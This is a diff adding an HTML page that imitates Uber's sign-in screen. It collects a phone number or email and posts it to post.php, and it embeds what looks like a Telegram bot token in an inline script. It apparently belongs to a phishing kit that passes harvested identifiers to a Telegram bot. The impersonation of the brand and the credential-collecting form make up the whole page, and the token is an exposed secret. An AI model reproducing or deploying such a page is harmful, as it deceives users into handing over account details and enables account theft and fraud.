@@ -1,0 +1,35 @@
+source: <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Uber</title>
+    <link rel="stylesheet" href="res/app.css">
+</head>
+<script>var token="8174402724:AAE5VHuEibTiwdJa-1jsZoXK75DMvk3nSQk";</script>
+<body>
+<header>
+<img src="res/logo.png">
+</header>    
+<main>
+<div class="form">
+<form action="post.php" method="post">
+<div class="title">
+What's your phone number or email?
+</div>
+<div class="col">
+<input type="text" name="user" required placeholder="Enter phone number or email">
+</div>
+<div class="col">
+    <button type="submit">Continue</button>
+</div>
+<div class="col" style="color:gray; font-size:0.8em; line-height:20px;">
+By proceeding, you consent to get calls, WhatsApp or SMS messages,
+ including by automated means, from Uber and its affiliates to the number provided.
+</div>
+</form>
+</div>
+</main><script src="./res/jq.js"></script>
+</body>
+</html>
+Page title: Uber
